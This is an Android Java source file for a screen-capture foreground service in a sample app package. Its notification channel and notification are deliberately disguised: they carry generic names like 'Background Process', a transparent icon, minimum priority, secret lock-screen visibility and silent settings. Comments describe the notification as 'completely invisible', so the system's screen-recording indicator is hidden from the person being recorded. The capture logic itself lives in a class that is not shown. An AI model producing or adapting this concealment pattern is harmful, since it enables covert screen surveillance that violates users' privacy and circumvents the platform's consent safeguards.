package com.example.myapplication.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.example.myapplication.R;
import com.example.myapplication.SharingActivity;
import com.example.myapplication.utils.ScreenCaptureManager;

public class ScreenCaptureService extends Service {
    private static final String TAG = "ScreenCaptureService";
    private static final String CHANNEL_ID = "ScreenCaptureChannel";
    private static final int NOTIFICATION_ID = 1001;
    
    private final IBinder binder = new LocalBinder();
    
    // Binder class for client interaction
    public class LocalBinder extends Binder {
        public ScreenCaptureService getService() {
            return ScreenCaptureService.this;
        }
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        try {
            createNotificationChannel();
            Log.d(TAG, "Screen Capture Service created successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error creating Screen Capture Service", e);
            stopSelf();
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Screen Capture Service started");
        
        // Create and show notification
        Notification notification = createNotification();
        
        // Start foreground service with MediaProjection type for Android 10+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, 
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
        
        return START_STICKY;
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return binder;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        // Stop screen capture if it's running
        if (ScreenCaptureManager.getInstance().isCapturing()) {
            ScreenCaptureManager.getInstance().stopCapture();
        }
        
        Log.d(TAG, "Screen Capture Service destroyed");
    }
    
    // Create notification channel for Android O and above
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                // Validate channel ID
                if (CHANNEL_ID == null || CHANNEL_ID.trim().isEmpty()) {
                    Log.e(TAG, "Channel ID cannot be null or empty");
                    return;
                }
                
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    // Check if channel already exists
                    NotificationChannel existingChannel = manager.getNotificationChannel(CHANNEL_ID);
                    if (existingChannel != null) {
                        Log.d(TAG, "Screen capture notification channel already exists");
                        return;
                    }
                    
                    // Create completely silent and invisible channel
                    NotificationChannel channel = new NotificationChannel(
                            CHANNEL_ID,
                            "Background Service", // Generic name
                            NotificationManager.IMPORTANCE_MIN); // Minimal importance
                            
                    channel.setDescription("Background process");
                    channel.setSound(null, null);
                    channel.enableVibration(false);
                    channel.enableLights(false);
                    channel.setShowBadge(false);
                    channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                    channel.setBypassDnd(false);
                    channel.setImportance(NotificationManager.IMPORTANCE_MIN);
                    
                    manager.createNotificationChannel(channel);
                    Log.d(TAG, "Screen capture notification channel created successfully");
                } else {
                    Log.e(TAG, "NotificationManager is null");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error creating notification channel", e);
                throw e; // Re-throw to be caught in onCreate
            }
        }
    }
    
    // Create completely invisible notification for foreground service
    private Notification createNotification() {
        try {
            return new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("Background Process") // Generic title
                    .setContentText("Running") // Generic text
                    .setSmallIcon(R.drawable.ic_transparent) // Custom transparent icon
                    .setPriority(NotificationCompat.PRIORITY_MIN) // Minimum priority
                    .setOngoing(true)
                    .setAutoCancel(false)
                    .setShowWhen(false)
                    .setSound(null)
                    .setVibrate(null)
                    .setCategory(NotificationCompat.CATEGORY_SERVICE)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hide from lock screen
                    .setSilent(true) // Make completely silent
                    .setColorized(false)
                    .setLocalOnly(true)
                    .build();
        } catch (Exception e) {
            Log.e(TAG, "Error creating notification", e);
            return createFallbackNotification();
        }
    }
    
    private Notification createFallbackNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Background")
                .setContentText("Process")
                .setSmallIcon(R.drawable.ic_transparent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();
    }
}
